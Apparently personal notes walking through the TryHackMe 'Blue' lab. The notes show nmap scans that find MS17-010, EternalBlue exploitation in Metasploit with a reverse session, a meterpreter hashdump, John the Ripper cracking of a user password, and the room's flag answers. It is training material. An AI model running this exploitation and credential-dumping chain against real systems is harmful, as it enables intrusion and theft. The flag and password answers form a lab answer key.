# Blue 

#FreeRoom 

Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

https://tryhackme.com/r/room/blue

https://youtu.be/32W6Y8fVFzg?feature=shared

```
10.10.81.43

nmap -sV -vv --script vuln TARGET_IP -oN nmap.txt

nmap -sS -Pn -A -p- -oN nmap.txt TARGET_IP

How many ports are open with a port number under 1000?
3

What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

ms17-010

| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

ls -la /usr/share/nmap/scripts | grep -e "smb-"

sudo nmap -sS -Pn -p 445 10.10.81.43 --script smb-vuln-ms17-010.nse

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 11:20 MST
Nmap scan report for 10.10.81.43
Host is up (0.19s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 2.29 seconds

```

## gain access 

Exploit the machine and gain a foothold.

```
Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

exploit/windows/smb/ms17_010_eternalblue

use 0

Show options and set the one required value. What is the name of this value? (All caps for submission) 
RHOSTS

show options
set RHOST 10.10.81.43
set LHOST 10.13.77.238
run

```

## escalate 

```
If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

Ctrl +Z -y
sessions

search shell_to
post/multi/manage/shell_to_meterpreter

use post/multi/manage/shell_to_meterpreter
show options

Select this (use MODULE_PATH). Show options, what option are we required to change?
session

sessions
set session 1
run 

sysinfo
shell
whoami

exit
```

## cracking 

```
meterpreter> hashdump
copy

nano hashes.txt     copy just Jon hash

Jon

sudo john --form=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

alqfna22
```

## flags

```
Flag1? This flag can be found at the system root.

meterpreter> cd C:\\
dir
cat  flag1.txt

flag{access_the_machine}

flag2
cd Users
cd Desktop
cd Documents
cd C:\\
locate -f flag2.txt
Windows\System32\config\flag2.txt
cd config
cat flag2.txt
flag{sam_database_elevated_access}

flag3
flag{admin_documents_can_be_valuable}
```

